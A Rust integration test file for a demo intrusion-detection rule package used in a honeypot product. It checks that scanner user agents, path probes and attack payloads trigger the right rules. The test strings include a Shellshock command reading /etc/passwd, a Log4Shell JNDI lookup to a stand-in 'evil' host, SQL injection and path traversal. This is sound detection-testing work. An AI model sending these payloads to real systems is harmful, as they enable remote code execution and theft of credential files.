//! 示范规则包（F7）集成测试：整包合法加载 + 典型载荷命中 + 方向/阈值语义。
//!
//! demo.rules 是 [detect.rules].path 的即用示例，也是子集规范的活文档——
//! 本测试保证它与解析器/匹配器保持一致（规范漂移在此失败）。

use aisafeguard_rules::MAX_RULES;
use aisafeguard_rules::ir::{Proto, Rule};
use aisafeguard_rules::loader::load_package;
use aisafeguard_rules::matcher::{Session, ThresholdTracker, rule_matches};

const DEMO: &str = include_str!("../demo.rules");

fn is_home(ip: std::net::IpAddr) -> bool {
    // 与产品口径一致（core::is_protected_ip）：回环/未指定/内网/链路本地均视为 home。
    // 蜜罐路径的本机侧占位 0.0.0.0 也因此落在 $HOME_NET 内。
    ip.is_loopback()
        || ip.is_unspecified()
        || matches!(ip, std::net::IpAddr::V4(v) if v.is_private())
}

fn honeypot_session(payload_direction_to_server: bool, dst_port: u16) -> Session<'static> {
    Session {
        client_ip: "203.0.113.7".parse().unwrap(),
        client_port: 44444,
        server_ip: "0.0.0.0".parse().unwrap(),
        server_port: dst_port,
        to_server: payload_direction_to_server,
        proto: Proto::Tcp,
        is_home: &is_home,
    }
}

fn rule_by_sid(rules: &[Rule], sid: u32) -> &Rule {
    rules
        .iter()
        .find(|r| r.sid == sid)
        .unwrap_or_else(|| panic!("sid {sid} 应存在"))
}

fn hits(rules: &[Rule], window: &[u8], s: &Session<'_>) -> Vec<u32> {
    rules
        .iter()
        .filter(|r| rule_matches(r, window, s))
        .map(|r| r.sid)
        .collect()
}

#[test]
fn demo_pack_loads_whole() {
    let rs = load_package(DEMO.as_bytes(), MAX_RULES).expect("示范包必须整包合法");
    assert_eq!(rs.rule_count, 16);
    assert_eq!(rs.rules[0].rule_id(), "sid:1000001");
}

#[test]
fn scanner_ua_rules_hit_honeypot_payload() {
    let rs = load_package(DEMO.as_bytes(), MAX_RULES).unwrap();
    let s = honeypot_session(true, 8081);
    let h = hits(
        &rs.rules,
        b"GET /admin HTTP/1.1\r\nUser-Agent: sqlmap/1.7.11#stable\r\n\r\n",
        &s,
    );
    assert!(h.contains(&1000001), "sqlmap UA 应命中: {h:?}");
    assert!(h.contains(&1000005), "GET /admin 应命中: {h:?}");

    assert!(
        hits(
            &rs.rules,
            b"GET / HTTP/1.1\r\nUser-Agent: Nikto/2.5.0\r\n",
            &s
        )
        .contains(&1000002)
    );
    assert!(
        hits(
            &rs.rules,
            b"GET / HTTP/1.1\r\nUser-Agent: gobuster/3.6\r\n",
            &s
        )
        .contains(&1000004)
    );
    // 普通浏览器 UA 不误报
    let clean = hits(
        &rs.rules,
        b"GET / HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0)\r\n",
        &s,
    );
    assert!(clean.is_empty(), "正常 UA 不应命中: {clean:?}");
}

#[test]
fn path_probe_rules_are_offset_anchored() {
    let rs = load_package(DEMO.as_bytes(), MAX_RULES).unwrap();
    let s = honeypot_session(true, 8081);
    // sid 1000005/1000006 锚定在请求行起点：出现在深处的同词不算
    assert!(hits(&rs.rules, b"GET /.env HTTP/1.1\r\n", &s).contains(&1000006));
    assert!(
        !hits(&rs.rules, b"GET /index.php?next=/.env HTTP/1.1\r\n", &s).contains(&1000006),
        "offset/depth 锚定：深处出现不算请求行"
    );
    // 大小写不敏感
    assert!(hits(&rs.rules, b"GET /ADMIN/config HTTP/1.1\r\n", &s).contains(&1000005));
}

#[test]
fn payload_pattern_rules_hit_any_listener() {
    let rs = load_package(DEMO.as_bytes(), MAX_RULES).unwrap();
    let s = honeypot_session(true, 1337);
    assert!(hits(&rs.rules, b"echo vulnerable () { :; }; cat /etc/passwd", &s).contains(&1000011));
    assert!(
        hits(
            &rs.rules,
            b"GET / HTTP/1.1\r\nX-Api-Version: ${jndi:ldap://evil/x}\r\n",
            &s
        )
        .contains(&1000012)
    );
    assert!(hits(&rs.rules, b"a=1 UNION SELECT password FROM users", &s).contains(&1000013));
    assert!(hits(&rs.rules, b"GET /../../etc/passwd HTTP/1.1", &s).contains(&1000010));
    // UNION 但不带 SELECT → 不误报
    assert!(!hits(&rs.rules, b"labour union members", &s).contains(&1000013));
}

#[test]
fn from_server_rule_never_hits_client_payload() {
    let rs = load_package(DEMO.as_bytes(), MAX_RULES).unwrap();
    let r = rule_by_sid(&rs.rules, 1000016);
    // to_server 载荷：不命中
    let s = honeypot_session(true, 8081);
    assert!(!rule_matches(r, b"root:x:0:0:root:/root:/bin/bash", &s));
    // from_server 载荷（服务器响应外传）：命中
    let resp = Session {
        client_ip: "203.0.113.7".parse().unwrap(),
        client_port: 44444,
        server_ip: "192.168.1.5".parse().unwrap(),
        server_port: 80,
        to_server: false,
        proto: Proto::Tcp,
        is_home: &is_home,
    };
    assert!(rule_matches(
        r,
        b"HTTP/1.1 200 OK\r\nroot:x:0:0:root:/root:/bin/bash",
        &resp
    ));
}

#[test]
fn threshold_rules_rate_limit() {
    let rs = load_package(DEMO.as_bytes(), MAX_RULES).unwrap();
    let r = rule_by_sid(&rs.rules, 1000015); // telnet root，both count=5/60s
    let s = honeypot_session(true, 2323);
    let mut tt = ThresholdTracker::default();
    let t = r.threshold.expect("sid 1000015 必须带 threshold");
    let mut fired = 0;
    for i in 0..6 {
        if rule_matches(r, b"root", &s)
            && tt.allow(&t, &format!("{}:{}", r.sid, s.client_ip), 1000 + i)
        {
            fired += 1;
        }
    }
    assert_eq!(fired, 1, "count=5 的 both 阈值在 6 次内只放行第 5 次一次");
}

#[test]
fn demo_rules_stay_inside_subset() {
    // 子集纪律的自检：任何规则漂移出白名单（pcre 标志、classtype、修饰符）都在加载期失败，
    // 由整包加载语义兜底——这里额外钉住示范包的规模与 sid 段。
    let rs = load_package(DEMO.as_bytes(), MAX_RULES).unwrap();
    for r in &rs.rules {
        assert!(
            (1000001..=1999999).contains(&r.sid),
            "示范包 sid 必须在示范段: {r:?}"
        );
        assert!(!r.msg.is_empty());
        assert!(r.threshold.is_none_or(|t| t.seconds > 0));
    }
}
